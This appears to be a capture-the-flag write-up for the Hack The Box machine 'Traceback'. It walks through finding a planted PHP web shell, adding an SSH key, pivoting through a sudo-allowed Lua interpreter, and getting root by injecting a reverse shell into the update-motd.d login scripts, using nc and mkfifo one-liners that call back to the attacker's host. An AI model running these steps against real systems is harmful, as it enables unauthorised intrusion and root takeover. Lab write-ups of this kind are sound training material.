# Traceback

## Getting User Flag
After nmap scanning, we only have SSH and HTTP ports enabled
```
kali@kali:~/Downloads$ dirb http://10.10.10.181/ /usr/share/wordlists/dirb/common.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr 22 16:28:29 2020
URL_BASE: http://10.10.10.181/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.181/ ----
+ http://10.10.10.181/index.html (CODE:200|SIZE:1113)                                                                                                     
+ http://10.10.10.181/server-status (CODE:403|SIZE:300)                                                                                                   
                                                                                                                                                          
-----------------
END_TIME: Wed Apr 22 16:32:39 2020
DOWNLOADED: 4612 - FOUND: 2
```

We've got a hint in the source page: 
<!--Some of the best web shells that you might need ;)-->

If we find this text in google, in this github we got it literally:
https://github.com/TheBinitGhimire/Web-Shells

I've got all webshell names and I've created a dictionary, and we can see the result below:
```
kali@kali:~/CTFs/Writeups/eternals/HTB/Traceback$ dirb http://10.10.10.181/ web_shells.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr 22 16:35:27 2020
URL_BASE: http://10.10.10.181/
WORDLIST_FILES: web_shells.txt

-----------------

GENERATED WORDS: 16                                                            

---- Scanning URL: http://10.10.10.181/ ----
+ http://10.10.10.181/smevk.php (CODE:200|SIZE:1261)                                                                                                      
                                                                                                                                                          
-----------------
END_TIME: Wed Apr 22 16:35:28 2020
DOWNLOADED: 16 - FOUND: 1
```
The code for the webshell found is there:
https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php

In this code, we can see that default user/password are admin/admin. I've tested it and it's worked.
So, now we are "webadmin" user, but we have no flag. There are another user, "sysadmin".

Next step will be to have ssh access to the machine, for soft purposes, and a better work. For this, we're gonna change the ssh_key for logging without knowing the password:

In local machine:
```
kali@kali:/tmp$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): /tmp/smevkv3
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/smevkv3.
Your public key has been saved in /tmp/smevkv3.pub.
The key fingerprint is:
SHA256:MRr1v2Zu8s4d6alseek7vADaNGzHljwsM2KvbkDFmwQ kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|      Eo.        |
|       .+.       |
|      .d.dX X    |
|      .. B O o . |
|       .. o =oo. |
|        ...*++=o |
|       oo  *B+B+ |
+----[SHA256]-----+

kali@kali:/tmp$ cat smevkv3.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABARqeqjNHw2cTtTWjzZ/Nw/KNEfXlEUt+uiv7hxqGyhNGbTOcp0eqdwjhHU7PK0zfff19iuQ2xX3R+WXAwsRqeqjNHw2cTtTWjzZ/Nw/KNENmb36FME+E2ToAX2JlM1eoA4gzz3WyhFcSaFLfGBRl4vCGYePA60zLhuocP2AqrY15WY1ubO+QO0WIVNnGpV/fsOD5WCS/LTZLR2m4sCvDqew53xxxxxxxDS14bxaAmDFbqPt0o+98kWbbMe7G/z2vysOTdkB9sItM0LCssu8K50kBBzI+F9lzgxb73sAsTCrjLu+W/XciFvnDJ938nkBvG20kCjOGDIyZfTjKygQIznl/qt0FkApZ2c0MFeFMFiH/E2uIPia7N2InWasRGw4h9/UudVDwUZ9VPTOQz2PleeXvEdiXLN4RJseHw3qanmdgbrwAQZAcAaAnjMsB34PwE5E0OisI0bZsBwqYZnIaWdjsI9CicZYpPxIfFDaSKhezP6TC5MwVMM74c= kali@kali
```

Now, we have to paste this complete key at the end of the victim's "/home/webadmin/.ssh/authorized_keys", and run the next command:
```
kali@kali:/tmp$ ssh webadmin@10.10.10.181 -i smevkv3 
```

Let's see now the enviroment:
In our home, we have a txt:

```
- sysadmin -
	I have left a tool to practice Lua.
	I'm sure you know where to find it.
	Contact me if you have any question.

webadmin 
```
And our .bash_history:
```
	ls -la
	sudo -l
	nano privesc.lua
	sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
	rm privesc.lua
	logout
```

So, we have a LUA compiler, owned by sysadmin, with the setuid enabled.
Using next command, we can see that we have a function to execute:
```
$ sudo -l
	Matching Defaults entries for webadmin on traceback:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User webadmin may run the following commands on traceback:
	    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

So, for pivoting access, we need to create a reverse shell in LUA, and execute it with this compiler.
```
webadmin@traceback:~$ echo 'os.execute("/bin/bash")' > privesc.lua
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
sysadmin@traceback:~$ whoami
sysadmin

```
okay, we have the first flag! :)

## Getting Root Flag
First of all, I've downloaded and copied pspy (https://github.com/DominicBreuker/pspy)

After executed it, we have an interesting automatic task:

```
2020/04/22 10:48:44 CMD: UID=0    PID=1      | /sbin/init noprompt 
2020/04/22 10:49:01 CMD: UID=0    PID=17135  | sleep 30 
2020/04/22 10:49:01 CMD: UID=0    PID=17134  | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
2020/04/22 10:49:01 CMD: UID=0    PID=17133  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
2020/04/22 10:49:01 CMD: UID=0    PID=17132  | /usr/sbin/CRON -f 
2020/04/22 10:49:01 CMD: UID=0    PID=17131  | /usr/sbin/CRON -f 
2020/04/22 10:50:01 CMD: UID=0    PID=17143  | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/                                
2020/04/22 10:50:01 CMD: UID=0    PID=17142  | sleep 30 
2020/04/22 10:50:01 CMD: UID=0    PID=17141  | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
2020/04/22 10:50:01 CMD: UID=0    PID=17140  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
2020/04/22 10:50:01 CMD: UID=0    PID=17139  | /usr/sbin/CRON -f 
2020/04/22 10:50:01 CMD: UID=0    PID=17138  | /usr/sbin/CRON -f 
2020/04/22 10:50:31 CMD: UID=0    PID=17144  | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/  
```
Also, we've seen that ssh connections are managed by root user, so let's go.
In /etc/update-motd.d we have some information messages for the system (MOTD means Message Of The Day), for instance, the 00-header is the message that appears after login using ssh, in the next case, is only the last line:
```
kali@kali:~/Downloads$ ssh -i /tmp/smevkv3  webadmin@10.10.10.181 
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 
```

If we inyect in this file a shell command, it will be executed by root user when a user login, so let's prepare the backdoor:

First of all, we've executed netcat listening in our machine:
```
sudo nc -nlvp 1999
```
After this, we've executed this command in the server:
```
nc 10.10.14.6 1999 -e /bin/sh
```
but it dodn't work because some stranges nc versions have no "-e" flag... However, we have an alternative (thanks to http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1999 >/tmp/f   
```

After all of that, with another term, we only have to ssh the server and:
```
kali@kali:/usr/share/wordlists$ sudo nc -nlvp 1999
listening on [any] 1999 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.181] 53238
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

We got it! :)